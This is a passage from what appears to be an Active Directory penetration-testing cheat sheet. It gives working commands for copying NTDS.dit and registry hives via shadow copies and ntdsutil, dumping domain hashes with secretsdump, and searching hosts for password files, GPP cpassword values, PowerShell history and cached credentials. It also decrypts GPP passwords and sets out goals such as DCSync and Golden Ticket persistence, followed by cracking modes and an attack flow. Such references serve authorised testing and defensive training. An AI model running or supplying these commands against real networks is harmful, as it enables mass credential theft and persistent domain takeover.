vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# ntdsutil method
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit

# Extract hashes offline
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

#### Credential Files and Locations

```powershell
# Common credential locations
dir /s /b C:\Users\*password*
dir /s /b C:\Users\*.kdbx
dir /s /b C:\Users\*unattend*
dir /s /b C:\Users\*sysprep*

# Group Policy Preferences (cpassword)
findstr /si "cpassword" \\<DC>\SYSVOL\<DOMAIN>\Policies\*.xml

# Web.config files
dir /s /b C:\inetpub\*.config

# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Cached credentials in credential manager
cmdkey /list
```

```bash
# Decrypt GPP passwords
python3 gpp-decrypt.py "<CPASSWORD_VALUE>"

# NetExec GPP module
netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M gpp_password
netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M gpp_autologin
```

---

## üéØ Success Metrics

A successful AD exploitation phase should achieve:

- ‚úÖ Domain Admin/Enterprise Admin privileges obtained
- ‚úÖ DCSync capability established
- ‚úÖ Golden Ticket created for persistent access
- ‚úÖ Comprehensive domain mapping via BloodHound
- ‚úÖ Multiple attack paths documented
- ‚úÖ Credential harvesting from key systems completed
- ‚úÖ Lateral movement to critical assets demonstrated

---

## üìù Quick Reference - Hash Modes

**Hashcat Modes:**

- `1000`¬†- NTLM
- `5600`¬†- NTLMv2 (NetNTLMv2)
- `13100`¬†- Kerberoast (TGS-REP etype 23)
- `18200`¬†- AS-REP Roast
- `19600`¬†- Kerberos 5 TGS-REP etype 17 (AES128)
- `19700`¬†- Kerberos 5 TGS-REP etype 18 (AES256)

**John Formats:**

- `nt`¬†- NTLM
- `netntlmv2`¬†- NTLMv2
- `krb5tgs`¬†- Kerberoast
- `krb5asrep`¬†- AS-REP Roast

---

## üîÑ Methodology Flow

```
1. Initial Enumeration
   ‚îî‚îÄ‚îÄ 5.1 AD Context & Discovery
   ‚îî‚îÄ‚îÄ 5.2 Basic AD Enumeration
           ‚Üì
2. Credential Attacks
   ‚îî‚îÄ‚îÄ 5.3 Password Attacks
   ‚îî‚îÄ‚îÄ 5.4 Kerberoasting  
   ‚îî‚îÄ‚îÄ 5.5 AS-REP Roasting
           ‚Üì
3. Credential Abuse
   ‚îî‚îÄ‚îÄ 5.6 Pass-the-Hash
   ‚îî‚îÄ‚îÄ 5.7 Pass-the-Ticket
   ‚îî‚îÄ‚îÄ 5.8 Lateral Movement
           ‚Üì
4. Attack Path Analysis
   ‚îî‚îÄ‚îÄ 5.13 BloodHound Analysis
   ‚îî‚îÄ‚îÄ 5.14 ACL-Based Attacks
           ‚Üì
5. Advanced Attacks
   ‚îî‚îÄ‚îÄ 5.9 NTLM Relay
   ‚îî‚îÄ‚îÄ 5.12 Delegation Abuse
   ‚îî‚îÄ‚îÄ 5.15 AD CS Abuse
           ‚Üì
6. Domain Dominance
   ‚îî‚îÄ‚îÄ 5.10 DCSync
   ‚îî‚îÄ‚îÄ 5.11 Golden/Silver Tickets
   ‚îî‚îÄ‚îÄ 5.16 Credential Extraction
           ‚Üì
7. Document & Persist
```

